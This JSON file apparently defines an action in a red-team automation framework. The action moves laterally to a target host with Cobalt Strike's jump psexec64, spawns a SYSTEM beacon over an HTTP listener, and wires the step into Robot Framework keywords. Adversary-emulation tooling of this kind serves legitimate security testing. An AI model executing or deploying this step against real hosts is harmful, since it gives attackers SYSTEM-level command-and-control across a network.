{
  "_key": "cs-lateral-psexec",
  "name": "Lateral Move PsExec64",
  "description": "Move laterally to a target host using PsExec via Cobalt Strike bjump - spawns SYSTEM beacon",
  "executionType": "cobalt_strike",
  "estimatedDuration": 20,
  "inputs": [
    { "id": "session", "label": "Beacon Session", "type": "session", "required": true }
  ],
  "outputs": [
    { "id": "lateral_session", "label": "Lateral Session", "type": "session", "description": "New beacon on lateral target as SYSTEM" }
  ],
  "parameters": [
    { "id": "targetIp",    "label": "Target IP",             "type": "string", "required": true,  "placeholder": "172.16.2.3", "default": "172.16.2.3" },
    { "id": "listener",    "label": "Listener",              "type": "string", "required": true,  "placeholder": "HTTP",       "default": "HTTP"       },
    { "id": "lateralWait", "label": "Lateral Wait (seconds)","type": "number", "required": false, "placeholder": "15",         "default": 15           }
  ],
  "requirements": {
    "c2Server": true,
    "listeners": ["HTTP"],
    "libraries": ["cobaltstrikec2/cobaltstrike.py"]
  },
  "robotFramework": {
    "keyword": "Run Bjump",
    "libraries": ["cobaltstrikec2/cobaltstrike.py"],
    "variables": [
      { "name": "TARGET2",      "fromParam": "targetIp",    "default": "172.16.2.3", "scope": "suite" },
      { "name": "LATERAL_WAIT", "fromParam": "lateralWait", "default": "15",         "scope": "suite" }
    ],
    "keywordArgs": [
      { "param": "session",  "position": 1, "sessionVariable": "CURRENT_SESSION" },
      { "staticValue": "psexec64", "position": 2 },
      { "param": "targetIp", "position": 3, "variableRef": true, "variableName": "TARGET2"      },
      { "param": "listener", "position": 4, "variableRef": true, "variableName": "HTTP_LISTENER" }
    ],
    "postKeywordStatements": [
      "Sleep    ${LATERAL_WAIT}s",
      "@{_lateral_sessions}=    Get Sessions By IP    ${TARGET2}",
      "${CURRENT_SESSION}=    Set Variable    ${_lateral_sessions[0]}"
    ],
    "sessionVariable": "CURRENT_SESSION",
    "preKeywordLog": "=== Lateral Move PSExec → ${TARGET2} ===",
    "documentation": "Lateral movement via PsExec64",
    "tags": ["lateral-movement", "psexec"]
  },
  "tactic": "TA0008",
  "icon": "🚀"
}